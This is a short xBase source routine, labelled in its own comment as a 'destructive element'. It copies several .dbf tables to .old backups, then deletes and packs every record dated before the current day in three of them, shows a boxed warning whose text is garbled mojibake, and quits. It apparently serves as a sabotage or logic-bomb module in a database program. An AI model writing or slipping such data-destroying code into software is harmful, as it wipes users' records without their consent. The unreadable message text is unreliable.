
*
* distructiven element !!!
*

vSYS_DATA = DATE()
CLOSE
COPY FILE k_pari.dbf TO k_pari.old
COPY FILE k_zemq.dbf TO k_zemq.old
COPY FILE l_polz.dbf TO l_polz.old
COPY FILE kart.dbf   TO kart.old
COPY FILE norma.dbf  TO norma.old

USE k_pari
GO TOP
DO WHILE !eof()
        IF (DTOC(OUT_DATA)>'01.01.80' .AND. OUT_DATA<vSYS_DATA)
                DELETE
        ENDIF
        SKIP +1
ENDDO
PACK
CLOSE


USE k_zemq
GO TOP
DO WHILE !eof()
        IF (DTOC(OUT_DATE)>'01.01.80' .AND. OUT_DATE<vSYS_DATA)
                DELETE
        ENDIF
        SKIP +1
ENDDO
PACK
CLOSE


USE l_polz
GO TOP
DO WHILE !eof()
        IF (DTOC(OUT_DATA)>'01.01.80' .AND. OUT_DATA<vSYS_DATA)
                DELETE
        ENDIF
        SKIP +1
ENDDO
PACK

CLOSE ALL
RELEASE ALL
RELEASE WIND db_wws
SET COLOR TO
CLEAR

@ 0,0,24,80 BOX '���������'

@ 10, 2 SAY ' ������������� ������� ������� ! � ���� ���������� �� �������� ������� �    '
@ 11, 2 SAY ' ���������� *.old, � ����� � ���������� ������������ �� ��������� �� ����.  '
@ 12, 2 SAY ' ����������� ���� ���� � ����� �� ������ ������� ����������, �� �� �� ������'
@ 13, 2 SAY ' ��� �� �� ������ �� ������������ ���������� ��������� (����� �������������)'
@ 14, 2 SAY ' �� ������������� ��������� � ���������� � ���������� ������� �� ���������� '
@ 15, 2 SAY '     �� ����� �������� ����� ���������� � ����������� ����� ����� � ���     '
@ 16, 2 SAY ' ��� �� ������ �� �� �������� � ���� �� ������� �� ���������� �� �������� ! '

@ 28, 2 SAY ' ��� ������������ ������ � ���������� � ����������� ������ !!! '

INKEY(0)

QUIT

RETURN
